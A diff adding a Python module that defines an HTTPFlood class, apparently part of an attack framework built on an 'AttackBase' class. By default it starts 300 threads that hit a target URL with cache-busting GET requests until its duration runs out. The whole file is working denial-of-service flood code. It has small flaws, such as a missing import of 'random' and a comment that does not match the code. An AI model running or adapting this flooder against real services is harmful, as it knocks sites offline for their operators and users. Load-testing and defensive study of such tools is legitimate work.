@@ -1,0 +1,26 @@
+import requests
+import threading
+from .base import AttackBase
+
+class HTTPFlood(AttackBase):
+    def __init__(self, target, threads=300, duration=60):
+        super().__init__(target, duration)
+        self.thread_count = threads
+
+    def _start_threads(self):
+        def flood():
+            session = requests.Session()
+            # Disable connection re‑use to simulate new connections
+            adapter = requests.adapters.HTTPAdapter(pool_connections=1, pool_maxsize=1)
+            session.mount('http://', adapter)
+            while self._running:
+                try:
+                    session.get(f"{self.target.base_url}/?{random.randint(0,999999)}", timeout=1)
+                except:
+                    pass
+
+        for _ in range(self.thread_count):
+            t = threading.Thread(target=flood)
+            t.daemon = True
+            self.threads.append(t)
+            t.start()
